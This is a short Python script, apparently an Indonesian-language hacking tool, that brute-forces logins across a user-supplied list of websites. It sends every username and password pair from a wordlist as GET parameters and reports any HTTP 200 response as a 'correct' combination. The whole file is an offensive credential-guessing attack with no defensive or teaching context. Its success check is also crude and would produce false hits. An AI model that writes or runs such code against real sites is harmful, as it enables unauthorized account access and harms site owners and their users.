import requests

# get file paths for usernames.txt and passwords.txt
filename_usernames = "wordlist.txt"
filename_passwords = "wordlist.txt"
filename_sites = input("\033[33mMasukan list website: \033[37m")

# open files for reading
with open(filename_usernames, "r") as usernames_file:
    usernames = [username.strip() for username in usernames_file.readlines()]

with open(filename_passwords, "r") as passwords_file:
    passwords = [password.strip() for password in passwords_file.readlines()]

with open(filename_sites, "r") as sites_file:
    sites = [site.strip() for site in sites_file.readlines()]

# check for valid usernames/passwords/sites given
if not usernames or not passwords or not sites:
    print("Usernames/passwords/sites list is empty! Exiting...")
    exit(1)

# iterate over every site and check for known usernames/passwords
for site in sites:
    # iterate over every username and check for known passwords
    for username in usernames:
        for password in passwords:
            try:
                # make a HTTP request to the target site with the username/password
                params = {'username': username, 'password': password}
                r = requests.get(site, params=params)

                # if the status code is anything other than '200' then the combination is wrong
                # and we can move on to the next password/username
                if r.status_code != 200:
                    print(f"Wrong username/password combination: '{site}''{username}'/'{password}'")
                    continue

                # else, if status code is 200, then the combination is correct, and we can break out of the loop
                print(f"Found correct username/password combination: '{site}'/'{username}'/'{password}'")
                break

            except requests.exceptions.RequestException as e:
                print(f"Error while trying username/password combination: '{site}'/'{username}'/'{password}'")
                print(f"Error: {e}")
